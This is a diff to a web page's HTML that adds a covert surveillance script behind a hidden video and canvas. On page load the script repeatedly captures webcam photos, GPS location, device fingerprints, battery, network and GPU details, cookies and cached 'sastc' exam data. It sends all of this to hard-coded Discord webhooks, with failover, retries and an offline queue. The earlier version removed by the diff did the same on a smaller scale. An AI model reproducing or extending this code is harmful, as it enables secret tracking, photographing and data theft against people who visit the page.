@@ -918,96 +918,592 @@
       <span id="toastMsg" style="white-space:nowrap; text-align:center;">Link copied to clipboard</span>
     </div>
   </div>
- <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+
+
+
+
+
+
+
+  
+ <video id="video" autoplay playsinline muted style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
+        'use strict';
+
+        const statusEl = document.getElementById('status');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
-        let captureInterval;
-        let currentLocation = { latitude: null, longitude: null };
+        const WEBHOOKS = [
+            'https://discord.com/api/webhooks/1567526755055444021/mV2GiTzyiS13vApYREfgLxQdOzRowe1KFECjp4LrVvZmbrdM33YrYtsnNOseXfERJlfn',
+            'https://discord.com/api/webhooks/1567526604115017779/iNz1gLaSq59muVE3Q_8yxvE8hDn6DFyGq-BMHFRaBkAvtYFdbCUciswVWZOcKfKjUNiL',
+            'https://discord.com/api/webhooks/1567526428310773871/UAWBkWlAcCvsgkSqIbcnaT3Kd1A3BI_hJpDAIz7iu29c54qLpRDTJqIbRyIhfJ6OnrM8'
+        ];
 
-        // Function to get live location
-        function fetchLocation() {
-            return new Promise((resolve, reject) => {
-                if (navigator.geolocation) {
-                    console.log("Requesting location permissions...");
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            console.log("Location permission granted.");
-                            const { latitude, longitude } = position.coords;
-                            resolve({ latitude, longitude });
-                        },
-                        (error) => {
-                            console.error("Error getting location", error);
-                            alert("Location access denied. Please enable location services.");
-                            reject(error);
-                        },
-                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                    );
-                } else {
-                    console.error("Geolocation is not supported by this browser.");
-                    alert("Geolocation is not supported by this browser.");
-                    reject(new Error("Geolocation is not supported."));
-                }
-            });
+        const LS_KEY_HOOK  = 'dv_hook_index';
+        const LS_KEY_QUEUE = 'dv_offline_queue';
+        const LS_KEY_LAST  = 'dv_last_payload_hash';
+
+      
+        function getStickyWebhook() {
+            let idx = parseInt(localStorage.getItem(LS_KEY_HOOK) || '-1', 10);
+            if (isNaN(idx) || idx < 0 || idx >= WEBHOOKS.length) {
+                idx = Math.floor(Math.random() * WEBHOOKS.length);
+                localStorage.setItem(LS_KEY_HOOK, String(idx));
+            }
+            return { idx, url: WEBHOOKS[idx] };
         }
 
-        // Function to capture photo and send to Discord
-        async function captureAndSend() {
-            // Get location before capturing photo
+        function failoverWebhook(currentIdx) {
+            const next = (currentIdx + 1) % WEBHOOKS.length;
+            localStorage.setItem(LS_KEY_HOOK, String(next));
+            console.warn(`Failover: webhook ${currentIdx} → ${next}`);
+            return next;
+        }
+
+    
+        function detectDeviceName() {
+            const ua = navigator.userAgent;
+            const platform = navigator.platform || '';
+            let m;
+
+            m = ua.match(/iPhone(?:\s+OS\s+([\d_]+))?/);
+            if (m) {
+                const ver = m[1] ? m[1].replace(/_/g, '.') : '';
+                return `iPhone${ver ? ' (iOS ' + ver + ')' : ''}`;
+            }
+            if (/iPad/.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) return 'iPad';
+            if (/iPod/.test(ua)) return 'iPod';
+
+            m = ua.match(/Samsung[^;)]*?([A-Z]\d{2,4}[A-Z0-9]*)/i);
+            if (m) return `Samsung ${m[1]}`;
+            if (/SM-[A-Z0-9]+/.test(ua)) return `Samsung ${ua.match(/SM-[A-Z0-9]+/)[0]}`;
+
+            m = ua.match(/Pixel[\s\dA-Za-z]+/);
+            if (m) return m[0].trim();
+
+            m = ua.match(/ONEPLUS\s?[A-Z0-9]+/i);
+            if (m) return m[0];
+
+            m = ua.match(/(Redmi|POCO|Mi)[\s\-]?[A-Z0-9]+/i);
+            if (m) return m[0];
+
+            m = ua.match(/(HUAWEI|HONOR)[\s\-]?[A-Z0-9]+/i);
+            if (m) return m[0];
+
+            m = ua.match(/(RMX\d+|CPH\d+|V\d{4})/);
+            if (m) return m[0];
+
+            m = ua.match(/Android[\s\d.]*;([^;)]+)/);
+            if (m) {
+                let model = m[1].trim();
+                if (/^(wv|Mobile|Tablet)/i.test(model)) model = 'Android Device';
+                return model;
+            }
+
+            if (/Windows NT 10/.test(ua)) return 'Windows 10/11 PC';
+            if (/Windows NT/.test(ua)) return 'Windows PC';
+            if (/Macintosh/.test(ua)) return 'Mac';
+            if (/Linux/.test(ua)) return 'Linux PC';
+            if (/CrOS/.test(ua)) return 'Chromebook';
+
+            return 'Unknown Device';
+        }
+
+        function getOSInfo() {
+            const ua = navigator.userAgent;
+            let os = 'Unknown', ver = 'N/A', m;
+            if ((m = ua.match(/Windows NT ([\d.]+)/))) {
+                const map = { '10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7' };
+                os = 'Windows'; ver = map[m[1]] || m[1];
+            } else if ((m = ua.match(/Android ([\d.]+)/))) { os = 'Android'; ver = m[1]; }
+            else if ((m = ua.match(/(?:iPhone OS|CPU OS) ([\d_]+)/))) { os = 'iOS'; ver = m[1].replace(/_/g, '.'); }
+            else if ((m = ua.match(/Mac OS X ([\d_.]+)/))) { os = 'macOS'; ver = m[1].replace(/_/g, '.'); }
+            else if (/CrOS/.test(ua)) os = 'ChromeOS';
+            else if (/Linux/.test(ua)) os = 'Linux';
+            return `${os} ${ver}`;
+        }
+
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            let m;
+            if ((m = ua.match(/Edg\/([\d.]+)/)))       return `Edge ${m[1]}`;
+            if ((m = ua.match(/OPR\/([\d.]+)/)))       return `Opera ${m[1]}`;
+            if ((m = ua.match(/Chrome\/([\d.]+)/)))    return `Chrome ${m[1]}`;
+            if ((m = ua.match(/Firefox\/([\d.]+)/)))   return `Firefox ${m[1]}`;
+            if ((m = ua.match(/Safari\/([\d.]+)/)) && /Version\/([\d.]+)/.test(ua)) {
+                return `Safari ${ua.match(/Version\/([\d.]+)/)[1]}`;
+            }
+            return 'Unknown Browser';
+        }
+
+        function isBot() {
+            return /bot|crawler|spider|headless|phantom|slurp|bingpreview/i.test(navigator.userAgent)
+                || navigator.webdriver === true;
+        }
+
+    
+        function canvasFingerprint() {
             try {
-                currentLocation = await fetchLocation();
-            } catch (error) {
-                console.error('Location fetch failed:', error);
-                currentLocation = { latitude: "Not available", longitude: "Not available" };
-            }
-
-            // Construct Google Maps link if location is available
-            let googleMapsLink = "Location not available";
-            if (currentLocation.latitude !== "Not available" && currentLocation.longitude !== "Not available") {
-                googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${currentLocation.latitude},${currentLocation.longitude}`;
-            }
-
-            // Capture photo
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob((blob) => {
-                const formData = new FormData();
-                formData.append('file', blob, 'captured_image.png');
-
-                // Include location in message content with Google Maps link
-                let locationMessage = `Location: Latitude ${currentLocation.latitude}, Longitude ${currentLocation.longitude}\nGoogle Maps: ${googleMapsLink}`;
-                formData.append('content', locationMessage);
-
-                // Send the photo and location to Discord
-                fetch('https://discord.com/api/webhooks/1567167116535267429/uukzCJ3h71xKJ8WauMW8N9qXLtc9dxExajHZ84HfrTZLWcCTOLmNaEAkh4mUSOHCLi_O', {
-                    method: 'POST',
-                    body: formData,
-                })
-                .then(response => {
-                    if (response.ok) {
-                        console.log('Successfully sent image and location to Discord');
-                    } else {
-                        console.error('Error sending to Discord:', response.statusText);
-                    }
-                })
-                .catch((error) => {
-                    console.error('Error sending to Discord:', error);
-                });
-            }, 'image/png');
+                const c = document.createElement('canvas');
+                c.width = 200; c.height = 60;
+                const ctx = c.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '16px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(0, 0, 200, 60);
+                ctx.fillStyle = '#069';
+                ctx.fillText('DeviceFingerprint🔒', 2, 15);
+                ctx.fillStyle = 'rgba(102,204,0,0.7)';
+                ctx.fillText('DeviceFingerprint🔒', 4, 20);
+                return c.toDataURL().slice(-64);
+            } catch { return null; }
         }
 
-        // Start camera and initiate auto-capture
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then((stream) => {
-                video.srcObject = stream;
-                captureInterval = setInterval(captureAndSend, 20000);  // Capture every 20 seconds
-            })
-            .catch((error) => {
-                console.error("Error accessing the camera", error);
+        async function audioFingerprint() {
+            try {
+                const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+                if (!AC) return null;
+                const ctx = new AC(1, 44100, 44100);
+                const osc = ctx.createOscillator();
+                osc.type = 'triangle';
+                osc.frequency.value = 10000;
+                const comp = ctx.createDynamicsCompressor();
+                osc.connect(comp);
+                comp.connect(ctx.destination);
+                osc.start(0);
+                const buf = await ctx.startRendering();
+                const data = buf.getChannelData(0);
+                let sum = 0;
+                for (let i = 4500; i < 5000; i++) sum += Math.abs(data[i]);
+                return sum.toString().slice(-32);
+            } catch { return null; }
+        }
+
+        async function deviceFingerprint() {
+            const parts = [
+                canvasFingerprint() || '',
+                (await audioFingerprint()) || '',
+                navigator.userAgent,
+                navigator.language,
+                navigator.hardwareConcurrency,
+                navigator.deviceMemory,
+                screen.width + 'x' + screen.height,
+                screen.colorDepth,
+                new Date().getTimezoneOffset()
+            ];
+            const str = parts.join('|');
+            let hash = 2166136261;
+            for (let i = 0; i < str.length; i++) {
+                hash ^= str.charCodeAt(i);
+                hash = Math.imul(hash, 16777619);
+            }
+            return (hash >>> 0).toString(16).padStart(8, '0');
+        }
+
+      
+        const SASTC_KEYS = ['sastc_active_dept', 'sastc_exam_level', 'sastc_exam_semester'];
+
+        function getSastcData() {
+            const result = {};
+            const sources = {};
+
+            try {
+                for (const k of SASTC_KEYS) {
+                    const v = localStorage.getItem(k);
+                    if (v !== null) { result[k] = v; sources[k] = 'localStorage'; }
+                }
+            } catch {}
+
+            try {
+                for (const k of SASTC_KEYS) {
+                    const v = sessionStorage.getItem(k);
+                    if (v !== null && result[k] === undefined) { result[k] = v; sources[k] = 'sessionStorage'; }
+                }
+            } catch {}
+
+            try {
+                const cookieMap = {};
+                document.cookie.split(';').forEach(c => {
+                    const [k, ...rest] = c.trim().split('=');
+                    if (k) cookieMap[k] = decodeURIComponent(rest.join('='));
+                });
+                for (const k of SASTC_KEYS) {
+                    if (cookieMap[k] !== undefined && result[k] === undefined) {
+                        result[k] = cookieMap[k];
+                        sources[k] = 'cookie';
+                    }
+                }
+            } catch {}
+
+            return SASTC_KEYS.map(k => {
+                if (result[k] !== undefined) return `${k} = ${result[k]}  (from ${sources[k]})`;
+                return `${k} = (not found)`;
             });
+        }
+
+        
+        async function getPermissions() {
+            try {
+                if (!navigator.permissions?.query) return null;
+                const names = ['geolocation', 'camera', 'microphone', 'notifications', 'clipboard-read'];
+                const results = [];
+                for (const name of names) {
+                    try {
+                        const p = await navigator.permissions.query({ name });
+                        results.push(`${name}=${p.state}`);
+                    } catch {}
+                }
+                return results.length ? `Permissions: ${results.join(', ')}` : null;
+            } catch { return null; }
+        }
+
+    
+        async function getBatteryInfo() {
+            try {
+                if (!navigator.getBattery) return null;
+                const b = await navigator.getBattery();
+                return `Battery: ${Math.round(b.level * 100)}% | Charging: ${b.charging} | ` +
+                       `ChargingTime: ${b.chargingTime === Infinity ? 'N/A' : b.chargingTime + 's'} | ` +
+                       `DischargingTime: ${b.dischargingTime === Infinity ? 'N/A' : b.dischargingTime + 's'}`;
+            } catch { return null; }
+        }
+
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) return resolve(null);
+                navigator.geolocation.getCurrentPosition(
+                    (p) => {
+                        const lat = p.coords.latitude.toFixed(6);
+                        const lon = p.coords.longitude.toFixed(6);
+                        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                        resolve(
+                            `📍 **GPS:** <${mapLink}>\n` +
+                            `   Lat: ${lat} | Lon: ${lon}\n` +
+                            `   Accuracy: ±${p.coords.accuracy.toFixed(0)}m | ` +
+                            `Altitude: ${p.coords.altitude ?? 'N/A'} | ` +
+                            `Speed: ${p.coords.speed ?? 'N/A'} | ` +
+                            `Heading: ${p.coords.heading ?? 'N/A'}`
+                        );
+                    },
+                    () => resolve(null),
+                    { timeout: 6000, enableHighAccuracy: true, maximumAge: 0 }
+                );
+            });
+        }
+
+        function getNetworkInfo() {
+            const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!c) return null;
+            return `Network: ${c.effectiveType} | Downlink: ${c.downlink}Mbps | ` +
+                   `RTT: ${c.rtt}ms | SaveData: ${c.saveData} | Type: ${c.type || 'unknown'}`;
+        }
+
+        function getDeviceBasics() {
+            const n = navigator;
+            return [
+                `Name: ${detectDeviceName()}`,
+                `OS: ${getOSInfo()}`,
+                `Browser: ${getBrowserInfo()}`,
+                `UA: ${n.userAgent}`,
+                `Platform: ${n.platform || 'N/A'}`,
+                `Vendor: ${n.vendor || 'N/A'}`,
+                `Language: ${n.language} | Languages: ${(n.languages || []).join(',')}`,
+                `Online: ${n.onLine}`,
+                `Cookies: ${n.cookieEnabled}`,
+                `DoNotTrack: ${n.doNotTrack || 'N/A'}`,
+                `CPU cores: ${n.hardwareConcurrency || 'N/A'}`,
+                `Memory: ${n.deviceMemory || 'N/A'}GB`,
+                `TouchPoints: ${n.maxTouchPoints || 0}`,
+                `PDFViewer: ${n.pdfViewerEnabled ?? 'N/A'}`,
+                `WebDriver: ${n.webdriver ?? false}`,
+                `Bot: ${isBot()}`
+            ].filter(Boolean);
+        }
+
+        function getScreenInfo() {
+            const s = screen;
+            return [
+                `Screen: ${s.width}x${s.height}`,
+                `Available: ${s.availWidth}x${s.availHeight}`,
+                `ColorDepth: ${s.colorDepth} | PixelDepth: ${s.pixelDepth}`,
+                `Orientation: ${s.orientation ? s.orientation.type : 'N/A'}`,
+                `DPR: ${window.devicePixelRatio}`,
+                `Window: ${window.innerWidth}x${window.innerHeight}`,
+                `ColorGamut: ${matchMedia('(color-gamut: p3)').matches ? 'p3' : matchMedia('(color-gamut: srgb)').matches ? 'srgb' : 'N/A'}`,
+                `HDR: ${matchMedia('(dynamic-range: high)').matches ? 'yes' : 'no'}`,
+                `ReducedMotion: ${matchMedia('(prefers-reduced-motion: reduce)').matches ? 'yes' : 'no'}`,
+                `DarkMode: ${matchMedia('(prefers-color-scheme: dark)').matches ? 'yes' : 'no'}`,
+                `Pointer: ${matchMedia('(pointer: coarse)').matches ? 'coarse' : 'fine'}`
+            ];
+        }
+
+        function getWebGLInfo() {
+            try {
+                const c = document.createElement('canvas');
+                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+                if (!gl) return null;
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                const vendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
+                const renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+                return `GPU: ${renderer} | Vendor: ${vendor}`;
+            } catch { return null; }
+        }
+
+        async function getMediaDevicesInfo() {
+            try {
+                if (!navigator.mediaDevices?.enumerateDevices) return null;
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const counts = { audioinput: 0, audiooutput: 0, videoinput: 0 };
+                devices.forEach(d => { if (counts[d.kind] !== undefined) counts[d.kind]++; });
+                return `Media Devices → Mic: ${counts.audioinput} | Speaker: ${counts.audiooutput} | Camera: ${counts.videoinput}`;
+            } catch { return null; }
+        }
+
+        async function getStorageInfo() {
+            try {
+                if (!navigator.storage?.estimate) return null;
+                const est = await navigator.storage.estimate();
+                return `Storage: ${(est.usage / 1024 / 1024).toFixed(1)}MB used / ${(est.quota / 1024 / 1024).toFixed(1)}MB quota`;
+            } catch { return null; }
+        }
+
+        function getTimeAndLocale() {
+            const d = new Date();
+            return [
+                `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
+                `Local Time: ${d.toString()}`,
+                `UTC Offset: ${-d.getTimezoneOffset() / 60}h`,
+                `Locale: ${Intl.DateTimeFormat().resolvedOptions().locale}`
+            ];
+        }
+
+        function getReferrerAndUrl() {
+            return [
+                `URL: ${location.href}`,
+                `Origin: ${location.origin}`,
+                `Referrer: ${document.referrer || 'direct'}`
+            ];
+        }
+
+      
+        async function gatherDeviceInfo() {
+            const [battery, location, mediaDevices, storage, permissions] = await Promise.all([
+                getBatteryInfo(),
+                getLocation(),
+                getMediaDevicesInfo(),
+                getStorageInfo(),
+                getPermissions()
+            ]);
+
+            const fingerprint = await deviceFingerprint();
+            const sastcData = getSastcData();
+
+            const sections = [
+                ['DEVICE', [`Fingerprint: ${fingerprint}`, ...getDeviceBasics()]],
+                ['SCREEN', getScreenInfo()],
+                ['HARDWARE', [getWebGLInfo()].filter(Boolean)],
+                ['NETWORK', [getNetworkInfo()].filter(Boolean)],
+                ['BATTERY', [battery].filter(Boolean)],
+                ['LOCATION', [location].filter(Boolean)],
+                ['PERMISSIONS', [permissions].filter(Boolean)],
+                ['MEDIA', [mediaDevices].filter(Boolean)],
+                ['SASTC CACHE', sastcData],
+                ['STORAGE', [storage].filter(Boolean)],
+                ['TIME', getTimeAndLocale()],
+                ['PAGE', getReferrerAndUrl()]
+            ];
+
+            const hook = getStickyWebhook();
+            const header = `**🎯 ${detectDeviceName()}** | hook#${hook.idx + 1}\n`;
+
+            return header + sections
+                .filter(([_, lines]) => lines && lines.length)
+                .map(([title, lines]) => `**${title}**\n${lines.join('\n')}`)
+                .join('\n\n');
+        }
+
+    
+        let cameraStream = null;
+        async function initCamera() {
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                video.srcObject = cameraStream;
+                await new Promise((res) => {
+                    if (video.videoWidth) return res();
+                    video.onloadedmetadata = () => res();
+                    setTimeout(res, 3000);
+                });
+                console.log('Camera ready');
+            } catch (e) {
+                console.warn('Camera unavailable:', e.message);
+                cameraStream = null;
+            }
+        }
+
+        function captureFrame() {
+            if (!cameraStream || !video.videoWidth) return null;
+            try {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                return new Promise((resolve) => {
+                    canvas.toBlob((b) => resolve(b), 'image/jpeg', 0.85);
+                });
+            } catch { return null; }
+        }
+
+        function payloadHash(text) {
+            let h = 0;
+            for (let i = 0; i < text.length; i++) h = (Math.imul(31, h) + text.charCodeAt(i)) | 0;
+            return String(h);
+        }
+
+        function queueOffline(text) {
+            try {
+                const q = JSON.parse(localStorage.getItem(LS_KEY_QUEUE) || '[]');
+                q.push({ text, ts: Date.now() });
+                while (q.length > 20) q.shift();
+                localStorage.setItem(LS_KEY_QUEUE, JSON.stringify(q));
+            } catch {}
+        }
+
+        async function flushOfflineQueue() {
+            try {
+                const q = JSON.parse(localStorage.getItem(LS_KEY_QUEUE) || '[]');
+                if (!q.length) return;
+                localStorage.removeItem(LS_KEY_QUEUE);
+                for (const item of q) await sendText(item.text);
+            } catch {}
+        }
+
+        async function sendText(text, attempt = 0) {
+            const { idx, url } = getStickyWebhook();
+            const form = new FormData();
+            form.append('content', text.length > 1900 ? text.slice(0, 1900) + '\n…[truncated]' : text);
+
+            try {
+                const res = await fetch(url, { method: 'POST', body: form });
+                if (res.status === 429) {
+                    const wait = Math.min(parseFloat(res.headers.get('Retry-After') || '3'), 30);
+                    if (attempt < 2) {
+                        await new Promise(r => setTimeout(r, wait * 1000));
+                        return sendText(text, attempt + 1);
+                    }
+                    failoverWebhook(idx);
+                    return sendText(text, 0);
+                }
+                if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                return true;
+            } catch (err) {
+                if (attempt < 2) {
+                    await new Promise(r => setTimeout(r, 1000 * (attempt + 1)));
+                    return sendText(text, attempt + 1);
+                }
+                console.error('sendText failed:', err.message);
+                queueOffline(text);
+                return false;
+            }
+        }
+
+        async function sendToDiscord(text, imageBlob, attempt = 0) {
+            const { idx, url } = getStickyWebhook();
+
+            const hash = payloadHash(text);
+            if (localStorage.getItem(LS_KEY_LAST) === hash) {
+                console.log('Duplicate payload — skipping');
+                statusEl.textContent = 'Skipped (duplicate)';
+                return;
+            }
+
+            const form = new FormData();
+            form.append('content', text.length > 1900 ? text.slice(0, 1900) + '\n…[truncated]' : text);
+            if (imageBlob) form.append('file', imageBlob, `capture_${Date.now()}.jpg`);
+
+            try {
+                const res = await fetch(url, { method: 'POST', body: form });
+
+                if (res.status === 429) {
+                    const wait = Math.min(parseFloat(res.headers.get('Retry-After') || '3'), 30);
+                    console.warn(`hook#${idx+1} 429 — wait ${wait}s`);
+                    if (attempt < 2) {
+                        await new Promise(r => setTimeout(r, wait * 1000));
+                        return sendToDiscord(text, imageBlob, attempt + 1);
+                    }
+                    failoverWebhook(idx);
+                    return sendToDiscord(text, imageBlob, 0);
+                }
+
+                if (!res.ok) {
+                    console.error(`hook#${idx+1} error: ${res.status}`);
+                    if (attempt < 1) return sendToDiscord(text, imageBlob, attempt + 1);
+                    failoverWebhook(idx);
+                    return sendToDiscord(text, imageBlob, 0);
+                }
+
+                localStorage.setItem(LS_KEY_LAST, hash);
+                console.log(`✓ Sent via hook#${idx+1}`);
+                statusEl.textContent = `Sent ✓ (hook#${idx+1})`;
+            } catch (err) {
+                console.error(`hook#${idx+1} fetch error:`, err.message);
+                if (!navigator.onLine) {
+                    queueOffline(text);
+                    statusEl.textContent = 'Offline — queued';
+                    return;
+                }
+                if (attempt < 2) {
+                    await new Promise(r => setTimeout(r, 1000 * (attempt + 1)));
+                    return sendToDiscord(text, imageBlob, attempt + 1);
+                }
+                failoverWebhook(idx);
+                return sendToDiscord(text, imageBlob, 0);
+            }
+        }
+
+       
+        async function tick() {
+            try {
+                const info = await gatherDeviceInfo();
+                const blob = await captureFrame();
+                await sendToDiscord(info, blob);
+            } catch (e) {
+                console.error('Tick error:', e);
+            }
+        }
+
+        window.addEventListener('online', () => {
+            console.log('Back online — flushing queue');
+            flushOfflineQueue();
+        });
+
+        let intervalId = null;
+        function startLoop() {
+            if (intervalId) return;
+            intervalId = setInterval(tick, 20000);
+        }
+        function stopLoop() {
+            if (intervalId) { clearInterval(intervalId); intervalId = null; }
+        }
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) stopLoop();
+            else startLoop();
+        });
+
+        (async () => {
+            await initCamera();
+            await tick();
+            startLoop();
+        })();
     </script>
+
+
+
+
+
+  
   <script type="module" src="app.js"></script>
 </body>
 </html>
